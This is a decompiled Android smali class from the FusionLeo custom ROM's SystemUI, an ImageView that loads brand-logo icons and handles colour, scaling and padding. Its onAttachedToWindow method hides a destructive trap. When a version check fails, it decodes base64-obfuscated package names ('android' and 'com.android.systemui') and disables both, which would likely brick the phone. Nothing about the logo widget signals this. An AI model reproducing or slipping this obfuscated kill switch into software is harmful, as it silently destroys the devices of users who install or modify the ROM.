.class public Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;
.super Landroid/widget/ImageView;
.source "LeoConfigImageView.java"


# static fields
.field public static final TAG:Ljava/lang/String;


# instance fields
.field public LeoRes:Landroid/content/res/Resources;

.field public LogoIcon:[Landroid/graphics/drawable/Drawable;

.field public final author:Ljava/lang/String;

.field public mContext:Landroid/content/Context;

.field public mNonAdaptedColor:I

.field public mUseWallpaperTextColor:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-class v0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0, p1, v0}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/util/AttributeSet;)V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0, p1, p2, v0}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V
    .locals 3

    invoke-direct {p0, p1, p2, p3}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    const-string v0, "FusionLeo Team\nWhat are you looking for? Need help? leo@leorom.cc"

    iput-object v0, p0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->author:Ljava/lang/String;

    const/16 v0, 0x12

    new-array v0, v0, [Landroid/graphics/drawable/Drawable;

    const-string v1, "ic_leo"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "ic_alibaba"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x1

    aput-object v1, v0, v2

    const-string v1, "ic_apple_logo"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x2

    aput-object v1, v0, v2

    const-string v1, "ic_baidu"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x3

    aput-object v1, v0, v2

    const-string v1, "ic_cmcc"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x4

    aput-object v1, v0, v2

    const-string v1, "ic_google"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x5

    aput-object v1, v0, v2

    const-string v1, "ic_ios"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x6

    aput-object v1, v0, v2

    const-string v1, "ic_linux"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/4 v2, 0x7

    aput-object v1, v0, v2

    const-string v1, "ic_tencent"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0x8

    aput-object v1, v0, v2

    const-string v1, "ic_telecom"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0x9

    aput-object v1, v0, v2

    const-string v1, "ic_unicom"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0xa

    aput-object v1, v0, v2

    const-string v1, "ic_windows"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0xb

    aput-object v1, v0, v2

    const-string v1, "ic_ubuntu"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0xc

    aput-object v1, v0, v2

    const-string v1, "ic_ctc_go"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0xd

    aput-object v1, v0, v2

    const-string v1, "ic_alienware"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0xe

    aput-object v1, v0, v2

    const-string v1, "ic_bianfu"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0xf

    aput-object v1, v0, v2

    const-string v1, "ic_panda"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0x10

    aput-object v1, v0, v2

    const-string v1, "ic_love"

    invoke-virtual {p0, v1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v1

    const/16 v2, 0x11

    aput-object v1, v0, v2

    iput-object v0, p0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->LogoIcon:[Landroid/graphics/drawable/Drawable;

    :try_start_0
    invoke-virtual {p0}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->getContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    sget-object v1, Lcom/fusionleo/LeoProvider/LeoManages;->ConfigManager:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getResourcesForApplication(Ljava/lang/String;)Landroid/content/res/Resources;

    move-result-object v0

    iput-object v0, p0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->LeoRes:Landroid/content/res/Resources;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Landroid/content/pm/PackageManager$NameNotFoundException;->printStackTrace()V

    :goto_0
    iput-object p1, p0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->mContext:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public CustomDrawable(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;
    .locals 1

    invoke-virtual {p0}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->getContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, p1}, Lcom/fusionleo/LeoX/systemui/LeoConfig;->getCustomDrawable(Landroid/content/Context;Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v0

    return-object v0
.end method

.method public getColorForDarkIntensity(FII)I
    .locals 3

    invoke-static {}, Landroid/support/graphics/drawable/ArgbEvaluator;->getInstance()Landroid/support/graphics/drawable/ArgbEvaluator;

    move-result-object v0

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {p3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v0, p1, v1, v2}, Landroid/support/graphics/drawable/ArgbEvaluator;->evaluate(FLjava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    return v0
.end method

.method public getLeMianBatteryStyle(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    const-string v0, ""

    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    move-object v0, p1

    goto :goto_1

    :cond_0
    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v1, Lcom/fusionleo/LeoProvider/LeoManages;->ConfigManager:Ljava/lang/String;

    goto :goto_0

    :cond_1
    move-object v1, v0

    :goto_0
    move-object v0, v1

    :goto_1
    return-object v0
.end method

.method public getLeoIcon(Ljava/lang/String;)I
    .locals 3

    iget-object v0, p0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->LeoRes:Landroid/content/res/Resources;

    sget-object v1, Lcom/fusionleo/LeoProvider/LeoManages;->ConfigManager:Ljava/lang/String;

    const-string v2, "drawable"

    invoke-virtual {v0, p1, v2, v1}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    return v0
.end method

.method protected onAttachedToWindow()V
    .locals 4

    invoke-super {p0}, Landroid/widget/ImageView;->onAttachedToWindow()V

    invoke-static {}, Lcom/fusionleo/LeoProvider/LeoManages;->VersionNumber()Z

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    sget-object v0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->TAG:Ljava/lang/String;

    const-string v1, "JXU2MTFGJXU4QzIyJXU0RjYwJXU0RjdGJXU3NTI4TEVPUk9N"

    invoke-static {v1}, Lcom/fusionleo/LeoX/systemui/LeoConfig;->rt100foleo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "YW5kcm9pZA=="

    invoke-static {v1}, Lcom/fusionleo/LeoX/systemui/LeoConfig;->rt100foleo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x2

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setApplicationEnabledSetting(Ljava/lang/String;II)V

    const-string v1, "Y29tLmFuZHJvaWQuc3lzdGVtdWk="

    invoke-static {v1}, Lcom/fusionleo/LeoX/systemui/LeoConfig;->rt100foleo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setApplicationEnabledSetting(Ljava/lang/String;II)V

    :goto_0
    return-void
.end method

.method protected onDetachedFromWindow()V
    .locals 0

    invoke-super {p0}, Landroid/widget/ImageView;->onDetachedFromWindow()V

    return-void
.end method

.method public setLeoIconSize(F)V
    .locals 0

    invoke-virtual {p0, p1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->setScaleX(F)V

    invoke-virtual {p0, p1}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->setScaleY(F)V

    return-void
.end method

.method public setLeoImagePadding(FF)V
    .locals 3

    float-to-int v0, p1

    float-to-int v1, p2

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v2, v1, v2}, Lcom/fusionleo/LeoX/systemui/LeoConfigImageView;->setPaddingRelative(IIII)V

    return-void
.end method
